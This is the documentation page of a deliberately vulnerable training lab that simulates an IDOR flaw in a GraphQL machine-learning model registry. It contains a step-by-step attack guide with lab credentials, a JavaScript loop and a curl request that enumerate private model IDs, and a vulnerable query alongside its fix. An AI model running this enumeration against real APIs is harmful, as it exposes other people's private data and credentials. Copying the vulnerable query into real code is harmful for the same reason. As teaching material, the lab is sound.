<?php
require_once 'config.php';
require_once '../progress.php';

$labSolved = isLabSolved(24);
$currentPage = 'overview';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - IDOR ML Model Registry</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(252, 109, 38, 0.3);
            padding: 1rem 2rem;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            font-size: 1.3rem;
            font-weight: bold;
            color: #fc6d26;
            text-decoration: none;
        }
        .logo svg { width: 32px; height: 32px; }
        .nav-links {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }
        .nav-links a { color: #e0e0e0; text-decoration: none; }
        .nav-links a:hover { color: #fc6d26; }
        .layout {
            display: flex;
            max-width: 1400px;
            margin: 0 auto;
        }
        .sidebar {
            width: 280px;
            min-height: calc(100vh - 60px);
            background: rgba(0, 0, 0, 0.3);
            border-right: 1px solid rgba(252, 109, 38, 0.2);
            padding: 1.5rem;
            position: sticky;
            top: 60px;
            height: calc(100vh - 60px);
            overflow-y: auto;
        }
        .sidebar h3 {
            color: #fc6d26;
            font-size: 0.85rem;
            text-transform: uppercase;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid rgba(252, 109, 38, 0.3);
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 0.25rem; }
        .sidebar-nav a {
            display: block;
            padding: 0.6rem 1rem;
            color: #aaa;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s;
            font-size: 0.9rem;
        }
        .sidebar-nav a:hover { background: rgba(252, 109, 38, 0.1); color: #fc6d26; }
        .sidebar-nav a.active {
            background: rgba(252, 109, 38, 0.2);
            color: #fc6d26;
            font-weight: 500;
        }
        .sidebar-nav .section-title {
            color: #666;
            font-size: 0.75rem;
            text-transform: uppercase;
            padding: 1rem 1rem 0.5rem;
            margin-top: 0.5rem;
        }
        .content {
            flex: 1;
            padding: 2rem 3rem;
            max-width: 900px;
        }
        .content h1 {
            color: #fc6d26;
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }
        .content h2 {
            color: #fc6d26;
            font-size: 1.5rem;
            margin: 2rem 0 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid rgba(252, 109, 38, 0.3);
        }
        .content h3 {
            color: #e0e0e0;
            font-size: 1.2rem;
            margin: 1.5rem 0 0.75rem;
        }
        .content p {
            color: #aaa;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .content ul, .content ol {
            color: #aaa;
            line-height: 1.8;
            margin-bottom: 1rem;
            padding-left: 1.5rem;
        }
        .content li { margin-bottom: 0.5rem; }
        .content code {
            background: rgba(0, 0, 0, 0.4);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            color: #88ff88;
            font-family: 'Consolas', monospace;
            font-size: 0.9em;
        }
        .code-block {
            background: #0d0d0d;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 1.25rem;
            font-family: 'Consolas', monospace;
            font-size: 0.85rem;
            color: #88ff88;
            overflow-x: auto;
            margin: 1rem 0;
            line-height: 1.6;
        }
        .code-block .comment { color: #666; }
        .code-block .vulnerable { color: #ff6666; }
        .code-block .secure { color: #00c853; }
        .code-block .highlight { color: #fc6d26; }
        .info-box {
            border-radius: 10px;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
        }
        .info-box.warning {
            background: rgba(255, 170, 0, 0.1);
            border: 1px solid rgba(255, 170, 0, 0.3);
        }
        .info-box.danger {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        .info-box.success {
            background: rgba(0, 200, 100, 0.1);
            border: 1px solid rgba(0, 200, 100, 0.3);
        }
        .info-box.info {
            background: rgba(252, 109, 38, 0.1);
            border: 1px solid rgba(252, 109, 38, 0.3);
        }
        .info-box h4 { margin-bottom: 0.5rem; }
        .info-box.warning h4 { color: #ffaa00; }
        .info-box.danger h4 { color: #ff6666; }
        .info-box.success h4 { color: #66ff99; }
        .info-box.info h4 { color: #fc6d26; }
        .info-box p { margin-bottom: 0; }
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 3rem;
            padding-top: 1.5rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        .nav-btn {
            padding: 0.75rem 1.5rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(252, 109, 38, 0.3);
            border-radius: 8px;
            color: #ccc;
            text-decoration: none;
            transition: all 0.3s;
        }
        .nav-btn:hover {
            background: rgba(252, 109, 38, 0.2);
            color: #fc6d26;
        }
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin: 1.5rem 0;
        }
        .feature-card {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(252, 109, 38, 0.2);
            border-radius: 10px;
            padding: 1.25rem;
            text-align: center;
        }
        .feature-card .icon { font-size: 2rem; margin-bottom: 0.5rem; }
        .feature-card h4 { color: #fc6d26; margin-bottom: 0.25rem; }
        .feature-card p { color: #888; font-size: 0.85rem; margin: 0; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        table th, table td {
            padding: 0.75rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        table th { color: #fc6d26; }
        @media (max-width: 900px) {
            .sidebar { display: none; }
            .content { padding: 1.5rem; }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">
                <svg viewBox="0 0 32 32" fill="none">
                    <path d="M16 2L2 12l14 18 14-18L16 2z" fill="#fc6d26"/>
                    <path d="M16 2L2 12h28L16 2z" fill="#e24329"/>
                    <path d="M16 30L2 12l4.5 18H16z" fill="#fca326"/>
                    <path d="M16 30l14-18-4.5 18H16z" fill="#fca326"/>
                </svg>
                MLRegistry
            </a>
            <nav class="nav-links">
                <a href="index.php">Lab Home</a>
                <a href="login.php">Login</a>
                <a href="lab-description.php">Lab Info</a>
                <a href="../index.php">All Labs</a>
            </nav>
        </div>
    </header>

    <div class="layout">
        <aside class="sidebar">
            <h3>📚 Documentation</h3>
            <ul class="sidebar-nav">
                <li><a href="#overview" class="active">Overview</a></li>
                <li class="section-title">Understanding</li>
                <li><a href="#vulnerability">The Vulnerability</a></li>
                <li><a href="#gid-format">GID Format</a></li>
                <li><a href="#api">GraphQL API</a></li>
                <li class="section-title">Exploitation</li>
                <li><a href="#exploitation">Attack Guide</a></li>
                <li><a href="#payloads">Sample Payloads</a></li>
                <li class="section-title">Defense</li>
                <li><a href="#prevention">Prevention</a></li>
                <li><a href="#impact">Impact Analysis</a></li>
            </ul>
            
            <h3 style="margin-top: 2rem;">🔗 Quick Links</h3>
            <ul class="sidebar-nav">
                <li><a href="lab-description.php">📋 Lab Description</a></li>
                <li><a href="login.php">🚀 Start Lab</a></li>
                <li><a href="success.php">🏆 Submit Solution</a></li>
                <li><a href="setup_db.php">🔄 Reset Lab</a></li>
            </ul>
        </aside>

        <main class="content">
            <h1>Lab 24: IDOR Exposes All ML Models</h1>
            <p style="color: #888; font-size: 1.1rem;">
                Learn how IDOR vulnerabilities in GraphQL APIs can expose private ML models and sensitive metadata.
            </p>

            <?php if ($labSolved): ?>
            <div class="info-box success">
                <h4>✓ Lab Completed</h4>
                <p>You've successfully exploited this vulnerability!</p>
            </div>
            <?php endif; ?>

            <section id="overview">
            <h2>What is This Lab About?</h2>
            <p>
                This lab simulates a real vulnerability found in GitLab's ML Model Registry (HackerOne #2670436). 
                The vulnerability allows any authenticated user to access private machine learning models 
                by manipulating sequential internal IDs in GraphQL API requests.
            </p>
            <p>
                The ML Model Registry stores sensitive data including model architectures, training hyperparameters,
                API keys, and credentials. The IDOR vulnerability exposes all this data across project boundaries.
            </p>

            <div class="feature-grid">
                <div class="feature-card">
                    <div class="icon">🔓</div>
                    <h4>IDOR</h4>
                    <p>Insecure Direct Object Reference</p>
                </div>
                <div class="feature-card">
                    <div class="icon">📡</div>
                    <h4>GraphQL</h4>
                    <p>API Vulnerability</p>
                </div>
                <div class="feature-card">
                    <div class="icon">🤖</div>
                    <h4>ML Registry</h4>
                    <p>Model Management</p>
                </div>
                <div class="feature-card">
                    <div class="icon">🎯</div>
                    <h4>HackerOne</h4>
                    <p>Real-World Bug</p>
                </div>
            </div>
            </section>

            <section id="vulnerability">
            <h2>The Vulnerability</h2>
            <p>
                The MLRegistry platform uses a GraphQL API that accepts model identifiers in GID format. 
                These GIDs contain sequential internal IDs that can be easily enumerated. The critical flaw 
                is that the API does not verify whether the authenticated user has permission to access the requested model.
            </p>

            <div class="info-box danger">
                <h4>🚨 Root Cause</h4>
                <p>
                    The <code>getModel</code> operation extracts the <code>internal_id</code> from the GID and queries 
                    the database without checking model ownership or visibility permissions.
                </p>
            </div>

            <h3>Vulnerable Code Pattern</h3>
            <div class="code-block">
<span class="comment">// VULNERABLE: No ownership check!</span>
$stmt = $pdo->prepare("
    SELECT * FROM ml_models 
    WHERE internal_id = ?  <span class="vulnerable">// ANY ID works!</span>
");
$stmt->execute([$internalId]);
<span class="comment">// Returns model data regardless of ownership</span>
            </div>
            </section>

            <section id="gid-format">
            <h2>GID Format</h2>
            <p>
                GitLab uses Global IDs (GIDs) to identify resources in their GraphQL API. Understanding this format 
                is crucial for exploiting this vulnerability.
            </p>

            <div class="info-box info">
                <h4>GID Structure</h4>
                <p>Format: <code>gid://gitlab/Ml::Model/{internal_id}</code></p>
            </div>

            <h3>Encoding/Decoding</h3>
            <div class="code-block">
<span class="comment">// Raw GID format:</span>
gid://gitlab/Ml::Model/<span class="highlight">1000501</span>

<span class="comment">// Base64 encoded (used in API requests):</span>
<span class="highlight">Z2lkOi8vZ2l0bGFiL01sOjpNb2RlbC8xMDAwNTAx</span>

<span class="comment">// JavaScript - Encode:</span>
btoa("gid://gitlab/Ml::Model/1000501")

<span class="comment">// JavaScript - Decode:</span>
atob("Z2lkOi8vZ2l0bGFiL01sOjpNb2RlbC8xMDAwNTAx")
            </div>

            <h3>Model Version GIDs</h3>
            <div class="code-block">
<span class="comment">// Model version format:</span>
gid://gitlab/Ml::ModelVersion/{internal_id}
            </div>
            </section>

            <section id="api">
            <h2>GraphQL API</h2>
            
            <h3>Endpoint</h3>
            <div class="code-block">
POST /api/graphql.php
Content-Type: application/json
            </div>

            <h3>Available Operations</h3>
            <table>
                <tr>
                    <th>Operation</th>
                    <th>Description</th>
                    <th>Vulnerable?</th>
                </tr>
                <tr>
                    <td><code>getModel</code></td>
                    <td>Retrieve model by GID</td>
                    <td style="color: #ff6666;">✗ Yes</td>
                </tr>
                <tr>
                    <td><code>getModelVersion</code></td>
                    <td>Retrieve specific version</td>
                    <td style="color: #ff6666;">✗ Yes</td>
                </tr>
            </table>

            <h3>Request Format</h3>
            <div class="code-block">
{
  "operationName": "getModel",
  "variables": {
    "id": "<span class="highlight">base64_encoded_gid</span>"
  }
}
            </div>
            </section>

            <section id="exploitation">
            <h2>Attack Guide</h2>

            <div class="info-box warning">
                <h4>⚠️ Educational Purpose Only</h4>
                <p>This information is for learning in a controlled lab environment. Never attempt on systems without authorization.</p>
            </div>

            <h3>Step-by-Step Exploitation</h3>
            <ol>
                <li><strong>Login as attacker</strong> - Use <code>attacker / attacker123</code></li>
                <li><strong>Find your model's GID</strong> - View your models page to see the GID format</li>
                <li><strong>Decode the GID</strong> - Use <code>atob()</code> to find your <code>internal_id = 1000500</code></li>
                <li><strong>Enumerate IDs</strong> - Try <code>1000501-1000507</code> for private models</li>
                <li><strong>Encode target GID</strong> - <code>btoa("gid://gitlab/Ml::Model/1000501")</code></li>
                <li><strong>Call the API</strong> - Send POST request with crafted GID</li>
                <li><strong>Extract secrets</strong> - Read descriptions and hyperparameters for credentials</li>
            </ol>

            <h3>Target Model IDs</h3>
            <table>
                <tr>
                    <th>Internal ID</th>
                    <th>Owner</th>
                    <th>Model Name</th>
                </tr>
                <tr>
                    <td>1000500</td>
                    <td>attacker (you)</td>
                    <td>test-classifier</td>
                </tr>
                <tr>
                    <td>1000501-1000504</td>
                    <td>victim_corp</td>
                    <td>4 private models</td>
                </tr>
                <tr>
                    <td>1000505-1000507</td>
                    <td>data_scientist</td>
                    <td>3 private models</td>
                </tr>
            </table>
            </section>

            <section id="payloads">
            <h2>Sample Payloads</h2>

            <h3>Browser Console (JavaScript)</h3>
            <div class="code-block">
<span class="comment">// Enumerate all private models</span>
for (let id = 1000501; id <= 1000507; id++) {
    const gid = btoa(`gid://gitlab/Ml::Model/${id}`);
    
    fetch('/Lab-24/api/graphql.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            operationName: 'getModel',
            variables: { id: gid }
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.data?.mlModel) {
            console.log(`<span class="highlight">ID ${id}</span>: ${data.data.mlModel.name}`);
            console.log(`  Owner: ${data.data.mlModel.owner.username}`);
        }
    });
}
            </div>

            <h3>cURL Command</h3>
            <div class="code-block">
curl -X POST http://localhost/Lab-24/api/graphql.php \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=your_session_id" \
  -d '{
    "operationName": "getModel",
    "variables": {
      "id": "<span class="highlight">Z2lkOi8vZ2l0bGFiL01sOjpNb2RlbC8xMDAwNTAx</span>"
    }
  }'
            </div>
            </section>

            <section id="prevention">
            <h2>Prevention</h2>

            <h3>Secure Code Pattern</h3>
            <div class="code-block">
<span class="comment">// SECURE: Always verify access rights</span>
$stmt = $pdo->prepare("
    SELECT m.* FROM ml_models m 
    WHERE m.internal_id = ?
    AND (
        m.owner_id = <span class="secure">?</span>                    <span class="comment">-- User owns the model</span>
        OR m.visibility = <span class="secure">'public'</span>        <span class="comment">-- Model is public</span>
        OR EXISTS (                       <span class="comment">-- User has project access</span>
            SELECT 1 FROM project_members pm 
            WHERE pm.project_id = m.project_id 
            AND pm.user_id = <span class="secure">?</span>
        )
    )
");
$stmt->execute([$internalId, <span class="secure">$userId</span>, <span class="secure">$userId</span>]);
            </div>

            <div class="info-box success">
                <h4>✅ Best Practices</h4>
                <ul style="margin: 0.5rem 0 0 1rem;">
                    <li>Always verify resource ownership before returning data</li>
                    <li>Use UUIDs instead of sequential IDs</li>
                    <li>Implement rate limiting to detect enumeration</li>
                    <li>Log and monitor for suspicious access patterns</li>
                </ul>
            </div>
            </section>

            <section id="impact">
            <h2>Impact Analysis</h2>

            <div class="info-box danger">
                <h4>🚨 Critical Impact</h4>
                <ul style="margin: 0.5rem 0 0 1rem;">
                    <li><strong>Confidentiality Breach</strong> - All private ML models exposed</li>
                    <li><strong>Credential Theft</strong> - API keys and secrets in metadata</li>
                    <li><strong>IP Theft</strong> - Proprietary model architectures</li>
                    <li><strong>Compliance Risk</strong> - GDPR/HIPAA if models contain PII</li>
                </ul>
            </div>

            <h3>CVSS Estimation</h3>
            <table>
                <tr><th>Metric</th><th>Value</th></tr>
                <tr><td>Attack Vector</td><td>Network</td></tr>
                <tr><td>Attack Complexity</td><td>Low</td></tr>
                <tr><td>Privileges Required</td><td>Low</td></tr>
                <tr><td>Confidentiality Impact</td><td>High</td></tr>
                <tr><td><strong>Score</strong></td><td><strong>7.7 (High)</strong></td></tr>
            </table>
            </section>

            <div class="nav-buttons">
                <a href="index.php" class="nav-btn">← Back to Lab</a>
                <a href="success.php" class="nav-btn">Submit Solution →</a>
            </div>
        </main>
    </div>
</body>
</html>
